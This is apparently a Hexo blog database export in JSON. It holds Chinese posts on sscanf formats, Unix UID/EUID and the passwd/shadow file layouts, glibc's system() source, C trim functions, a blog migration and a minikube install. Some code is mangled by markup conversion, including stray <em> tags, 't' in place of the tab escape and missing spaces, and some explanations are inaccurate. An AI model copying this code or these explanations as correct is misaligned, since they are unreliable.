非%符号}\n　　注：\n　　1、 * 亦可用于格式中, (即 %*d 和 %*s) 加了星号 (*) 表示跳过此数据不读入. (也就是不把此数据读入参数中)\n　　2、{a|b|c}表示a,b,c中选一，[d],表示可以有d也可以没有d。\n　　3、width表示读取宽度。\n　　4、{h | l | I64 | L}:参数的size,通常h表示单字节size，I表示2字节 size,L表示4字节size(double例外),l64表示8字节size。\n　　5、type :这就很多了，就是%s,%d之类。\n　　6、特别的：%*[width] [{h | l | I64 | L}]type 表示满足该条件的被过滤掉，不会向目标参数中写入值\n　　支持集合操作：\n　　%[a-z] 表示匹配a到z中任意字符，贪婪性(尽可能多的匹配)\n　　%[aB'] 匹配a、B、'中一员，贪婪性\n　　%[^a] 匹配非a的任意字符，贪婪性\n例子：\n　　1. 常见用法。\n　　char buf[512] ={0} ;\n　　sscanf(\"123456 \", \"%s\", buf);\n　　printf(\"%s/n\", buf);\n　　结果为：123456\n　　2. 取指定长度的字符串。如在下例中，取最大长度为4字节的字符串。\n　　sscanf(\"123456 \", \"%4s\", buf);\n　　printf(\"%s/n\", buf);\n　　结果为：1234\n　　3. 取到指定字符为止的字符串。如在下例中，取遇到空格为止字符串。\n　　sscanf(\"123456 abcdedf\", \"%[^  ]\", buf);\n　　printf(\"%s/n\", buf);\n　　结果为：123456\n　　4. 取仅包含指定字符集的字符串。如在下例中，取仅包含1到9和小写字母的字符串。\n　　sscanf(\"123456abcdedfBCDEF\", \"%[1-9a-z]\", buf);\n　　printf(\"%s/n\", buf);\n　　结果为：123456abcdedf\n　　5. 取到指定字符集为止的字符串。如在下例中，取遇到大写字母为止的字符串。\n　　sscanf(\"123456abcdedfBCDEF\", \"%[^A-Z]\", buf);\n　　printf(\"%s/n\", buf);\n　　结果为：123456abcdedf\n　　6、给定一个字符串iios/12DDWDFF@122，获取 / 和 @ 之间的字符串，先将 \"iios/\"过滤掉，再将非'@'的一串内容送到buf中\n　　sscanf(\"iios/12DDWDFF@122\", \"%*[^/]/%[^@]\", buf);\n　　printf(\"%s/n\", buf);\n　　结果为：12DDWDFF\n    7、分解key1088@163.com\n    sscanf(\"key1088@163.com\",\"%[^@]%*c%s\", user, host);\n    结果为：user=key1088,host=163.com","source":"_posts/sscanf函数的用法.md","raw":"title: sscanf函数的用法\ncategories: [程序设计,C编程]\ntags: []\ndate: 2014-03-16 15:05:21\n---\nsscanf() - 从一个字符串中读进与指定格式相符的数据.\n函数原型:\nint sscanf( string str, string fmt, mixed var1, mixed var2 ... );\nint scanf( const char *format [,argument]... );\n说明：\n　　sscanf与scanf类似，都是用于输入的，只是后者以屏幕(stdin)为输入源，前者以固定字符串为输入源。\n　　其中的format可以是一个或多个 {%[*] [width] [{h | l | I64 | L}]type | ' ' | '/t' | '/n' | 非%符号}\n　　注：\n　　1、 * 亦可用于格式中, (即 %*d 和 %*s) 加了星号 (*) 表示跳过此数据不读入. (也就是不把此数据读入参数中)\n　　2、{a|b|c}表示a,b,c中选一，[d],表示可以有d也可以没有d。\n　　3、width表示读取宽度。\n　　4、{h | l | I64 | L}:参数的size,通常h表示单字节size，I表示2字节 size,L表示4字节size(double例外),l64表示8字节size。\n　　5、type :这就很多了，就是%s,%d之类。\n　　6、特别的：%*[width] [{h | l | I64 | L}]type 表示满足该条件的被过滤掉，不会向目标参数中写入值\n　　支持集合操作：\n　　%[a-z] 表示匹配a到z中任意字符，贪婪性(尽可能多的匹配)\n　　%[aB'] 匹配a、B、'中一员，贪婪性\n　　%[^a] 匹配非a的任意字符，贪婪性\n例子：\n　　1. 常见用法。\n　　char buf[512] ={0} ;\n　　sscanf(\"123456 \", \"%s\", buf);\n　　printf(\"%s/n\", buf);\n　　结果为：123456\n　　2. 取指定长度的字符串。如在下例中，取最大长度为4字节的字符串。\n　　sscanf(\"123456 \", \"%4s\", buf);\n　　printf(\"%s/n\", buf);\n　　结果为：1234\n　　3. 取到指定字符为止的字符串。如在下例中，取遇到空格为止字符串。\n　　sscanf(\"123456 abcdedf\", \"%[^  ]\", buf);\n　　printf(\"%s/n\", buf);\n　　结果为：123456\n　　4. 取仅包含指定字符集的字符串。如在下例中，取仅包含1到9和小写字母的字符串。\n　　sscanf(\"123456abcdedfBCDEF\", \"%[1-9a-z]\", buf);\n　　printf(\"%s/n\", buf);\n　　结果为：123456abcdedf\n　　5. 取到指定字符集为止的字符串。如在下例中，取遇到大写字母为止的字符串。\n　　sscanf(\"123456abcdedfBCDEF\", \"%[^A-Z]\", buf);\n　　printf(\"%s/n\", buf);\n　　结果为：123456abcdedf\n　　6、给定一个字符串iios/12DDWDFF@122，获取 / 和 @ 之间的字符串，先将 \"iios/\"过滤掉，再将非'@'的一串内容送到buf中\n　　sscanf(\"iios/12DDWDFF@122\", \"%*[^/]/%[^@]\", buf);\n　　printf(\"%s/n\", buf);\n　　结果为：12DDWDFF\n    7、分解key1088@163.com\n    sscanf(\"key1088@163.com\",\"%[^@]%*c%s\", user, host);\n    结果为：user=key1088,host=163.com","slug":"sscanf函数的用法","published":1,"updated":"2023-04-22T05:38:44.912Z","_id":"clgrjlxjc006r7opihoqo9tdu","comments":1,"layout":"post","photos":[],"link":"","content":"<p>sscanf() - 从一个字符串中读进与指定格式相符的数据.<br>函数原型:<br>int sscanf( string str, string fmt, mixed var1, mixed var2 … );<br>int scanf( const char *format [,argument]… );<br>说明：<br>　　sscanf与scanf类似，都是用于输入的，只是后者以屏幕(stdin)为输入源，前者以固定字符串为输入源。<br>　　其中的format可以是一个或多个 </p>\n","site":{"data":{}},"excerpt":"","more":"<p>sscanf() - 从一个字符串中读进与指定格式相符的数据.<br>函数原型:<br>int sscanf( string str, string fmt, mixed var1, mixed var2 … );<br>int scanf( const char *format [,argument]… );<br>说明：<br>　　sscanf与scanf类似，都是用于输入的，只是后者以屏幕(stdin)为输入源，前者以固定字符串为输入源。<br>　　其中的format可以是一个或多个 </p>\n"},{"title":"UID,EUID,GID,EGID的关系","date":"2010-05-18T01:37:00.000Z","_content":"什么是UID,EUID,GID,EGID？<br />真正用户标识号（UID）：该标识号负责标识运行进程的用户。roor是0.<br />有效用户标识号（EUID）：该标识号负责标识以什么用户身份来给新创建的进程赋所有权、检查文件的存取权限和检查通过系统调用kill向进程发送软 中断信号的许可权限。我认为是EUID调用UID执行权限。<br />真正用户组标识号(GID)：负责标识运行进程的用户所属的组ID。<br />有效用户组标识号(EGID)：用来标识目前进程所属的用户组。可能因为执行文件设置set-gid位而与gid不同。<br /><p>每个用户有一个uid和gid, 这个记录在/etc/passwd,  /etc/group里面，每个文件有一个uid，  就是拥有这个文件的用户的uid。每个用户运行一个程序时是以自己的uid作为身份的，如果这个程序被设置了stick位，则这个程序以程序拥有者的 uid作为身份，程序运行时的这个身份(uid)就是euid,  表示这个程序以那个用户的身份运行（这样就拥有那个用户的权限，比如读取属于他的文件）。所以程序运行时的身份euid一般情况下都是运行这个程序的人的 uid，有时会是这个程序拥有者的uid。</p><p>以passwd程序为例，这个程序要写/etc/passwd,  /etc/shadow，一般用户对这些文件是没有写权限的，用户A运行了passwd，这个passwd进程的euid就是uidA，当要写这两个文件 时，passwd调用了setuid(seteuid?)，这样这个passwd进程的euid就是uidRoot了，passwd就可以写那两个文件 了，写完之后euid再切换成uidA.这个过程就实现了对/etc/passwd,  /etc/shadow的受控访问：普通用户只允许按照passwd程序定义好的方式修改这两个文件。</p><p>下面来看下这两个文件：</p><p>（1）/etc/passwd <br />功能：存放系统的用户帐号信息 <br />内 容：用户名　密码 UID GID 所属组用户主目录 SHELL <br />实例： u1 ： x ： 0 ： 0 ： u1 　　　  /home/u1　：/bin/bash</p><p>注：如果采用了shadow，此处存放口令的为屏蔽字符，真正密码保存在/etc/shadow中 。</p><p>如果不采用shadow，采用明文件显示，如果采用md5加密的话所存放的为密文。</p><p>（2）/etc/shadow</p><p>功能：存放用户口令（加密过的口令） <br />实例： u1 ： bq$# ： 10750： 0：  999 ：7 ： -1 ：-1 ： 12546 <br />说明： u1 用户名 <br />b1$# 加密的口令　　 <br />10750  从1970.1.1开始计算，该口令修改后已过去了多少天 <br />０　　　需要再过多少天这个口令可以被修改 <br />9999  密码的有效期 <br />7 口令失效多少天前发出警告 <br />-1 口令失效多少天之后禁用这个账户 <br />-1  口令从1970.1.1计算,该口令已经禁用了多少天 <br />12546 保留</p><p> </p><br />","source":"_posts/UID,EUID,GID,EGID的关系.md","raw":"title: UID,EUID,GID,EGID的关系\ncategories: [Linux]\ntags: []\ndate: 2010-05-18 09:37:00\n---\n什么是UID,EUID,GID,EGID？<br />真正用户标识号（UID）：该标识号负责标识运行进程的用户。roor是0.<br />有效用户标识号（EUID）：该标识号负责标识以什么用户身份来给新创建的进程赋所有权、检查文件的存取权限和检查通过系统调用kill向进程发送软 中断信号的许可权限。我认为是EUID调用UID执行权限。<br />真正用户组标识号(GID)：负责标识运行进程的用户所属的组ID。<br />有效用户组标识号(EGID)：用来标识目前进程所属的用户组。可能因为执行文件设置set-gid位而与gid不同。<br /><p>每个用户有一个uid和gid, 这个记录在/etc/passwd,  /etc/group里面，每个文件有一个uid，  就是拥有这个文件的用户的uid。每个用户运行一个程序时是以自己的uid作为身份的，如果这个程序被设置了stick位，则这个程序以程序拥有者的 uid作为身份，程序运行时的这个身份(uid)就是euid,  表示这个程序以那个用户的身份运行（这样就拥有那个用户的权限，比如读取属于他的文件）。所以程序运行时的身份euid一般情况下都是运行这个程序的人的 uid，有时会是这个程序拥有者的uid。</p><p>以passwd程序为例，这个程序要写/etc/passwd,  /etc/shadow，一般用户对这些文件是没有写权限的，用户A运行了passwd，这个passwd进程的euid就是uidA，当要写这两个文件 时，passwd调用了setuid(seteuid?)，这样这个passwd进程的euid就是uidRoot了，passwd就可以写那两个文件 了，写完之后euid再切换成uidA.这个过程就实现了对/etc/passwd,  /etc/shadow的受控访问：普通用户只允许按照passwd程序定义好的方式修改这两个文件。</p><p>下面来看下这两个文件：</p><p>（1）/etc/passwd <br />功能：存放系统的用户帐号信息 <br />内 容：用户名　密码 UID GID 所属组用户主目录 SHELL <br />实例： u1 ： x ： 0 ： 0 ： u1 　　　  /home/u1　：/bin/bash</p><p>注：如果采用了shadow，此处存放口令的为屏蔽字符，真正密码保存在/etc/shadow中 。</p><p>如果不采用shadow，采用明文件显示，如果采用md5加密的话所存放的为密文。</p><p>（2）/etc/shadow</p><p>功能：存放用户口令（加密过的口令） <br />实例： u1 ： bq$# ： 10750： 0：  999 ：7 ： -1 ：-1 ： 12546 <br />说明： u1 用户名 <br />b1$# 加密的口令　　 <br />10750  从1970.1.1开始计算，该口令修改后已过去了多少天 <br />０　　　需要再过多少天这个口令可以被修改 <br />9999  密码的有效期 <br />7 口令失效多少天前发出警告 <br />-1 口令失效多少天之后禁用这个账户 <br />-1  口令从1970.1.1计算,该口令已经禁用了多少天 <br />12546 保留</p><p> </p><br />","slug":"UID,EUID,GID,EGID的关系","published":1,"updated":"2023-04-22T05:38:44.696Z","_id":"clgrjlxjd006t7opi38z4bbjy","comments":1,"layout":"post","photos":[],"link":"","content":"<p>什么是UID,EUID,GID,EGID？<br />真正用户标识号（UID）：该标识号负责标识运行进程的用户。roor是0.<br />有效用户标识号（EUID）：该标识号负责标识以什么用户身份来给新创建的进程赋所有权、检查文件的存取权限和检查通过系统调用kill向进程发送软 中断信号的许可权限。我认为是EUID调用UID执行权限。<br />真正用户组标识号(GID)：负责标识运行进程的用户所属的组ID。<br />有效用户组标识号(EGID)：用来标识目前进程所属的用户组。可能因为执行文件设置set-gid位而与gid不同。<br /><p>每个用户有一个uid和gid, 这个记录在&#x2F;etc&#x2F;passwd,  &#x2F;etc&#x2F;group里面，每个文件有一个uid，  就是拥有这个文件的用户的uid。每个用户运行一个程序时是以自己的uid作为身份的，如果这个程序被设置了stick位，则这个程序以程序拥有者的 uid作为身份，程序运行时的这个身份(uid)就是euid,  表示这个程序以那个用户的身份运行（这样就拥有那个用户的权限，比如读取属于他的文件）。所以程序运行时的身份euid一般情况下都是运行这个程序的人的 uid，有时会是这个程序拥有者的uid。</p><p>以passwd程序为例，这个程序要写&#x2F;etc&#x2F;passwd,  &#x2F;etc&#x2F;shadow，一般用户对这些文件是没有写权限的，用户A运行了passwd，这个passwd进程的euid就是uidA，当要写这两个文件 时，passwd调用了setuid(seteuid?)，这样这个passwd进程的euid就是uidRoot了，passwd就可以写那两个文件 了，写完之后euid再切换成uidA.这个过程就实现了对&#x2F;etc&#x2F;passwd,  &#x2F;etc&#x2F;shadow的受控访问：普通用户只允许按照passwd程序定义好的方式修改这两个文件。</p><p>下面来看下这两个文件：</p><p>（1）&#x2F;etc&#x2F;passwd <br />功能：存放系统的用户帐号信息 <br />内 容：用户名　密码 UID GID 所属组用户主目录 SHELL <br />实例： u1 ： x ： 0 ： 0 ： u1 　　　  &#x2F;home&#x2F;u1　：&#x2F;bin&#x2F;bash</p><p>注：如果采用了shadow，此处存放口令的为屏蔽字符，真正密码保存在&#x2F;etc&#x2F;shadow中 。</p><p>如果不采用shadow，采用明文件显示，如果采用md5加密的话所存放的为密文。</p><p>（2）&#x2F;etc&#x2F;shadow</p><p>功能：存放用户口令（加密过的口令） <br />实例： u1 ： bq$# ： 10750： 0：  999 ：7 ： -1 ：-1 ： 12546 <br />说明： u1 用户名 <br />b1$# 加密的口令　　 <br />10750  从1970.1.1开始计算，该口令修改后已过去了多少天 <br />０　　　需要再过多少天这个口令可以被修改 <br />9999  密码的有效期 <br />7 口令失效多少天前发出警告 <br />-1 口令失效多少天之后禁用这个账户 <br />-1  口令从1970.1.1计算,该口令已经禁用了多少天 <br />12546 保留</p><p> </p><br /></p>\n","site":{"data":{}},"excerpt":"","more":"<p>什么是UID,EUID,GID,EGID？<br />真正用户标识号（UID）：该标识号负责标识运行进程的用户。roor是0.<br />有效用户标识号（EUID）：该标识号负责标识以什么用户身份来给新创建的进程赋所有权、检查文件的存取权限和检查通过系统调用kill向进程发送软 中断信号的许可权限。我认为是EUID调用UID执行权限。<br />真正用户组标识号(GID)：负责标识运行进程的用户所属的组ID。<br />有效用户组标识号(EGID)：用来标识目前进程所属的用户组。可能因为执行文件设置set-gid位而与gid不同。<br /><p>每个用户有一个uid和gid, 这个记录在&#x2F;etc&#x2F;passwd,  &#x2F;etc&#x2F;group里面，每个文件有一个uid，  就是拥有这个文件的用户的uid。每个用户运行一个程序时是以自己的uid作为身份的，如果这个程序被设置了stick位，则这个程序以程序拥有者的 uid作为身份，程序运行时的这个身份(uid)就是euid,  表示这个程序以那个用户的身份运行（这样就拥有那个用户的权限，比如读取属于他的文件）。所以程序运行时的身份euid一般情况下都是运行这个程序的人的 uid，有时会是这个程序拥有者的uid。</p><p>以passwd程序为例，这个程序要写&#x2F;etc&#x2F;passwd,  &#x2F;etc&#x2F;shadow，一般用户对这些文件是没有写权限的，用户A运行了passwd，这个passwd进程的euid就是uidA，当要写这两个文件 时，passwd调用了setuid(seteuid?)，这样这个passwd进程的euid就是uidRoot了，passwd就可以写那两个文件 了，写完之后euid再切换成uidA.这个过程就实现了对&#x2F;etc&#x2F;passwd,  &#x2F;etc&#x2F;shadow的受控访问：普通用户只允许按照passwd程序定义好的方式修改这两个文件。</p><p>下面来看下这两个文件：</p><p>（1）&#x2F;etc&#x2F;passwd <br />功能：存放系统的用户帐号信息 <br />内 容：用户名　密码 UID GID 所属组用户主目录 SHELL <br />实例： u1 ： x ： 0 ： 0 ： u1 　　　  &#x2F;home&#x2F;u1　：&#x2F;bin&#x2F;bash</p><p>注：如果采用了shadow，此处存放口令的为屏蔽字符，真正密码保存在&#x2F;etc&#x2F;shadow中 。</p><p>如果不采用shadow，采用明文件显示，如果采用md5加密的话所存放的为密文。</p><p>（2）&#x2F;etc&#x2F;shadow</p><p>功能：存放用户口令（加密过的口令） <br />实例： u1 ： bq$# ： 10750： 0：  999 ：7 ： -1 ：-1 ： 12546 <br />说明： u1 用户名 <br />b1$# 加密的口令　　 <br />10750  从1970.1.1开始计算，该口令修改后已过去了多少天 <br />０　　　需要再过多少天这个口令可以被修改 <br />9999  密码的有效期 <br />7 口令失效多少天前发出警告 <br />-1 口令失效多少天之后禁用这个账户 <br />-1  口令从1970.1.1计算,该口令已经禁用了多少天 <br />12546 保留</p><p> </p><br /></p>\n"},{"title":"system函数原型","date":"2012-08-30T09:33:00.000Z","_content":"<pre>\n116 #ifdef FORK\n117  pid = FORK ();\n118 #else\n119  pid = __fork ();\n120 #endif\n121  if(pid == (pid_t) 0)\n122    {\n123      /** Child side.  */\n124      constchar*new_argv[4];\n125      new_argv[0] = SHELL_NAME;\n126      new_argv[1] = \"-c\";\n127      new_argv[2] = line;\n128      new_argv[3] = NULL;\n129\n130      /** Restore the signals.  */\n131      (void) __sigaction (SIGINT, &intr, (structsigaction *) NULL);\n132      (void) __sigaction (SIGQUIT, &quit, (structsigaction *) NULL);\n133      (void) __sigprocmask (SIG_SETMASK, &omask, (sigset_t *) NULL);\n134      INIT_LOCK ();\n135\n136      /** Exec the shell.  */\n137      (void) __execve (SHELL_PATH, (char*const*) new_argv, __environ);  //exec被代替改程序，如果失败的话，就是执行下一条\n138      _exit (127);  //直接进入内核中断，返回127.\n139    }\n140  elseif(pid < (pid_t) 0)\n141    /** The fork failed.  */\n142    status = -1;\n143  else\n144    /** Parent side.  */\n145    {\n146      /** Note the system() is a cancellation point.  But since we call\n147     waitpid() which itself is a cancellation point we do not\n148     have to do anything here.  */\n149      if(TEMP_FAILURE_RETRY (__waitpid (pid, &status, 0)) != pid)\n150    status = -1;\n151    }\n</pre>","source":"_posts/system函数原型.md","raw":"title: system函数原型\ncategories: [C编程]\ntags: []\ndate: 2012-08-30 17:33:00\n---\n<pre>\n116 #ifdef FORK\n117  pid = FORK ();\n118 #else\n119  pid = __fork ();\n120 #endif\n121  if(pid == (pid_t) 0)\n122    {\n123      /** Child side.  */\n124      constchar*new_argv[4];\n125      new_argv[0] = SHELL_NAME;\n126      new_argv[1] = \"-c\";\n127      new_argv[2] = line;\n128      new_argv[3] = NULL;\n129\n130      /** Restore the signals.  */\n131      (void) __sigaction (SIGINT, &intr, (structsigaction *) NULL);\n132      (void) __sigaction (SIGQUIT, &quit, (structsigaction *) NULL);\n133      (void) __sigprocmask (SIG_SETMASK, &omask, (sigset_t *) NULL);\n134      INIT_LOCK ();\n135\n136      /** Exec the shell.  */\n137      (void) __execve (SHELL_PATH, (char*const*) new_argv, __environ);  //exec被代替改程序，如果失败的话，就是执行下一条\n138      _exit (127);  //直接进入内核中断，返回127.\n139    }\n140  elseif(pid < (pid_t) 0)\n141    /** The fork failed.  */\n142    status = -1;\n143  else\n144    /** Parent side.  */\n145    {\n146      /** Note the system() is a cancellation point.  But since we call\n147     waitpid() which itself is a cancellation point we do not\n148     have to do anything here.  */\n149      if(TEMP_FAILURE_RETRY (__waitpid (pid, &status, 0)) != pid)\n150    status = -1;\n151    }\n</pre>","slug":"system函数原型","published":1,"updated":"2023-04-22T05:38:44.918Z","_id":"clgrjlxje006w7opigl0ra1q1","comments":1,"layout":"post","photos":[],"link":"","content":"<pre>\n116 #ifdef FORK\n117  pid = FORK ();\n118 #else\n119  pid = __fork ();\n120 #endif\n121  if(pid == (pid_t) 0)\n122    {\n123      /** Child side.  */\n124      constchar*new_argv[4];\n125      new_argv[0] = SHELL_NAME;\n126      new_argv[1] = \"-c\";\n127      new_argv[2] = line;\n128      new_argv[3] = NULL;\n129\n130      /** Restore the signals.  */\n131      (void) __sigaction (SIGINT, &intr, (structsigaction *) NULL);\n132      (void) __sigaction (SIGQUIT, &quit, (structsigaction *) NULL);\n133      (void) __sigprocmask (SIG_SETMASK, &omask, (sigset_t *) NULL);\n134      INIT_LOCK ();\n135\n136      /** Exec the shell.  */\n137      (void) __execve (SHELL_PATH, (char*const*) new_argv, __environ);  //exec被代替改程序，如果失败的话，就是执行下一条\n138      _exit (127);  //直接进入内核中断，返回127.\n139    }\n140  elseif(pid < (pid_t) 0)\n141    /** The fork failed.  */\n142    status = -1;\n143  else\n144    /** Parent side.  */\n145    {\n146      /** Note the system() is a cancellation point.  But since we call\n147     waitpid() which itself is a cancellation point we do not\n148     have to do anything here.  */\n149      if(TEMP_FAILURE_RETRY (__waitpid (pid, &status, 0)) != pid)\n150    status = -1;\n151    }\n</pre>","site":{"data":{}},"excerpt":"","more":"<pre>\n116 #ifdef FORK\n117  pid = FORK ();\n118 #else\n119  pid = __fork ();\n120 #endif\n121  if(pid == (pid_t) 0)\n122    {\n123      /** Child side.  */\n124      constchar*new_argv[4];\n125      new_argv[0] = SHELL_NAME;\n126      new_argv[1] = \"-c\";\n127      new_argv[2] = line;\n128      new_argv[3] = NULL;\n129\n130      /** Restore the signals.  */\n131      (void) __sigaction (SIGINT, &intr, (structsigaction *) NULL);\n132      (void) __sigaction (SIGQUIT, &quit, (structsigaction *) NULL);\n133      (void) __sigprocmask (SIG_SETMASK, &omask, (sigset_t *) NULL);\n134      INIT_LOCK ();\n135\n136      /** Exec the shell.  */\n137      (void) __execve (SHELL_PATH, (char*const*) new_argv, __environ);  //exec被代替改程序，如果失败的话，就是执行下一条\n138      _exit (127);  //直接进入内核中断，返回127.\n139    }\n140  elseif(pid < (pid_t) 0)\n141    /** The fork failed.  */\n142    status = -1;\n143  else\n144    /** Parent side.  */\n145    {\n146      /** Note the system() is a cancellation point.  But since we call\n147     waitpid() which itself is a cancellation point we do not\n148     have to do anything here.  */\n149      if(TEMP_FAILURE_RETRY (__waitpid (pid, &status, 0)) != pid)\n150    status = -1;\n151    }\n</pre>"},{"title":"trim很简单的代码，但是很常用","date":"2013-11-04T15:02:29.000Z","_content":"void ltrim(char <em>s)\n{\n char *p;\n p = s;\n while(</em>p == ' ' || <em>p == 't'){</em>p++;}\n strcpy(s,p);\n}\nvoid rtrim(char *s)\n{\n int i;\n if (s == NULL)\n   return;\n i = strlen(s)-1;\n while((s[i] == ' ' || s[i] == 't') &amp;&amp; i >= 0){i--;};\n s[i+1] = '\u0000';\n}\nvoid trim(char *s){\n    ltrim(s);\n    rtrim(s);\n}","source":"_posts/trim很简单的代码，但是很常用.md","raw":"title: trim很简单的代码，但是很常用\ncategories: [C编程]\ntags: []\ndate: 2013-11-04 23:02:29\n---\nvoid ltrim(char <em>s)\n{\n char *p;\n p = s;\n while(</em>p == ' ' || <em>p == 't'){</em>p++;}\n strcpy(s,p);\n}\nvoid rtrim(char *s)\n{\n int i;\n if (s == NULL)\n   return;\n i = strlen(s)-1;\n while((s[i] == ' ' || s[i] == 't') &amp;&amp; i >= 0){i--;};\n s[i+1] = '\u0000';\n}\nvoid trim(char *s){\n    ltrim(s);\n    rtrim(s);\n}","slug":"trim很简单的代码，但是很常用","published":1,"updated":"2023-04-22T05:38:44.921Z","_id":"clgrjlxjn007f7opi9h815f30","comments":1,"layout":"post","photos":[],"link":"","content":"<p>void ltrim(char <em>s)<br>{<br> char *p;<br> p &#x3D; s;<br> while(</em>p &#x3D;&#x3D; ‘ ‘ || <em>p &#x3D;&#x3D; ‘t’){</em>p++;}<br> strcpy(s,p);<br>}<br>void rtrim(char *s)<br>{<br> int i;<br> if (s &#x3D;&#x3D; NULL)<br>   return;<br> i &#x3D; strlen(s)-1;<br> while((s[i] &#x3D;&#x3D; ‘ ‘ || s[i] &#x3D;&#x3D; ‘t’) &amp;&amp; i &gt;&#x3D; 0){i–;};<br> s[i+1] &#x3D; ‘\u0000’;<br>}<br>void trim(char *s){<br>    ltrim(s);<br>    rtrim(s);<br>}</p>\n","site":{"data":{}},"excerpt":"","more":"<p>void ltrim(char <em>s)<br>{<br> char *p;<br> p &#x3D; s;<br> while(</em>p &#x3D;&#x3D; ‘ ‘ || <em>p &#x3D;&#x3D; ‘t’){</em>p++;}<br> strcpy(s,p);<br>}<br>void rtrim(char *s)<br>{<br> int i;<br> if (s &#x3D;&#x3D; NULL)<br>   return;<br> i &#x3D; strlen(s)-1;<br> while((s[i] &#x3D;&#x3D; ‘ ‘ || s[i] &#x3D;&#x3D; ‘t’) &amp;&amp; i &gt;&#x3D; 0){i–;};<br> s[i+1] &#x3D; ‘\u0000’;<br>}<br>void trim(char *s){<br>    ltrim(s);<br>    rtrim(s);<br>}</p>\n"},{"title":"乔迁新居-百度空间导入到WORDPRESS","date":"2012-12-22T07:47:43.000Z","_content":"<div>\n在末日来临之前，把百度的东西全部搬来这里来了。\n这里是那？这里openshift.redhat.com，一个面向开源开发人员开放的平台即服务(PaaS)，很给力。\n不知道这里是不是像新浪一样最后收费，走着看吧，我还是挺相信红帽的。\n&nbsp;\n来说一下百度空间怎么导入到wordpress里面，在这里推荐一个工具，此神器叫BlogsToWordPress。\n下载地址和方法见官方，python编写的很给力的工具：http://www.crifan.com/crifan_released_all/website/python/blogstowordpress/\n这个可以直接导入图片到本地，注意的是在xml文件中的图片地址\n<a href=\"/images/2012/12/20121221173719194-300x60.png\"><img class=\"alignnone size-thumbnail wp-image-300\" src=\"/images/2012/12/20121221173719194-300x60-150x150.png\" alt=\"\" width=\"150\" height=\"150\" /></a>\n把图片上传到指定路径下，批量修改XML中的地址就可以了。\n</div>","source":"_posts/乔迁新居-百度空间导入到WORDPRESS.md","raw":"title: 乔迁新居-百度空间导入到WORDPRESS\ncategories: [生活感想]\ntags: []\ndate: 2012-12-22 15:47:43\n---\n<div>\n在末日来临之前，把百度的东西全部搬来这里来了。\n这里是那？这里openshift.redhat.com，一个面向开源开发人员开放的平台即服务(PaaS)，很给力。\n不知道这里是不是像新浪一样最后收费，走着看吧，我还是挺相信红帽的。\n&nbsp;\n来说一下百度空间怎么导入到wordpress里面，在这里推荐一个工具，此神器叫BlogsToWordPress。\n下载地址和方法见官方，python编写的很给力的工具：http://www.crifan.com/crifan_released_all/website/python/blogstowordpress/\n这个可以直接导入图片到本地，注意的是在xml文件中的图片地址\n<a href=\"/images/2012/12/20121221173719194-300x60.png\"><img class=\"alignnone size-thumbnail wp-image-300\" src=\"/images/2012/12/20121221173719194-300x60-150x150.png\" alt=\"\" width=\"150\" height=\"150\" /></a>\n把图片上传到指定路径下，批量修改XML中的地址就可以了。\n</div>","slug":"乔迁新居-百度空间导入到WORDPRESS","published":1,"updated":"2023-04-22T05:38:44.971Z","_id":"clgrjlxjp007g7opi1f7wb1eq","comments":1,"layout":"post","photos":[],"link":"","content":"<div>\n在末日来临之前，把百度的东西全部搬来这里来了。\n这里是那？这里openshift.redhat.com，一个面向开源开发人员开放的平台即服务(PaaS)，很给力。\n不知道这里是不是像新浪一样最后收费，走着看吧，我还是挺相信红帽的。\n&nbsp;\n来说一下百度空间怎么导入到wordpress里面，在这里推荐一个工具，此神器叫BlogsToWordPress。\n下载地址和方法见官方，python编写的很给力的工具：http://www.crifan.com/crifan_released_all/website/python/blogstowordpress/\n这个可以直接导入图片到本地，注意的是在xml文件中的图片地址\n<a href=\"/images/2012/12/20121221173719194-300x60.png\"><img class=\"alignnone size-thumbnail wp-image-300\" src=\"/images/2012/12/20121221173719194-300x60-150x150.png\" alt=\"\" width=\"150\" height=\"150\" /></a>\n把图片上传到指定路径下，批量修改XML中的地址就可以了。\n</div>","site":{"data":{}},"excerpt":"","more":"<div>\n在末日来临之前，把百度的东西全部搬来这里来了。\n这里是那？这里openshift.redhat.com，一个面向开源开发人员开放的平台即服务(PaaS)，很给力。\n不知道这里是不是像新浪一样最后收费，走着看吧，我还是挺相信红帽的。\n&nbsp;\n来说一下百度空间怎么导入到wordpress里面，在这里推荐一个工具，此神器叫BlogsToWordPress。\n下载地址和方法见官方，python编写的很给力的工具：http://www.crifan.com/crifan_released_all/website/python/blogstowordpress/\n这个可以直接导入图片到本地，注意的是在xml文件中的图片地址\n<a href=\"/images/2012/12/20121221173719194-300x60.png\"><img class=\"alignnone size-thumbnail wp-image-300\" src=\"/images/2012/12/20121221173719194-300x60-150x150.png\" alt=\"\" width=\"150\" height=\"150\" /></a>\n把图片上传到指定路径下，批量修改XML中的地址就可以了。\n</div>"},{"title":"Ubuntu 安装minikebe","date":"2019-11-26T15:22:00.000Z","_content":"&nbsp;\n<h5>1.下载并安装</h5>\n<code class=\"language-shell\" data-lang=\"shell\">curl -LO https://storage.googleapis.com/minikube/releases/latest/minikube_1.5.2.deb \\\n&amp;&amp; sudo dpkg -i minikube_1.5.2.deb</code>\n\n2.查看是否支持虚拟化\n<div class=\"highlight\">\n<h5><code class=\"language-shell\" data-lang=\"shell\">egrep -q 'vmx|svm' /proc/cpuinfo &amp;&amp; echo yes || echo no</code></h5>\n3.启动minikebe，需要网络下载\n<div class=\"highlight\">\n<pre><code class=\"language-shell\" data-lang=\"shell\">1)本地运行\n\nsudo minikube start --vm-driver=none</code> <code class=\"language-shell\" data-lang=\"shell\">2)使用vbox运行（不能使用root用户，vbox非不能用root）</code></pre>\n<div class=\"highlight\">\n<pre><code class=\"language-shell\" data-lang=\"shell\">minikube start --vm-driver=virtualbox</code> <code class=\"language-shell\" data-lang=\"shell\">3)设置默认运行环境\n</code><code class=\"language-shell\" data-lang=\"shell\">sudo minikube config set vm-driver none</code></pre>\n<div class=\"code-tabs\">\n<div class=\"tab-content\">\n<div class=\"tab-pane active\" title=\"虚拟盒子\">\n<div class=\"highlight\">\n<div class=\"code-tabs\">\n<div class=\"tab-content\">\n<div class=\"tab-pane active\" title=\"无（裸金属）\">\n<div class=\"highlight\">\n<pre><code class=\"language-shell\" data-lang=\"shell\">or</code></pre>\n</div>\n</div>\n</div>\n</div>\n<pre><code class=\"language-shell\" data-lang=\"shell\">minikube config set vm-driver virtualbox\n\n4)国内网络限制，使用aliyun的资源\n</code></pre>\n<pre><code>minikube start --vm-driver=virtualbox --image-mirror-country=cn \n?  Ubuntu 18.04 上的 minikube v1.5.2\n?  Tip: Use 'minikube start -p &lt;name&gt;' to create a new cluster, or 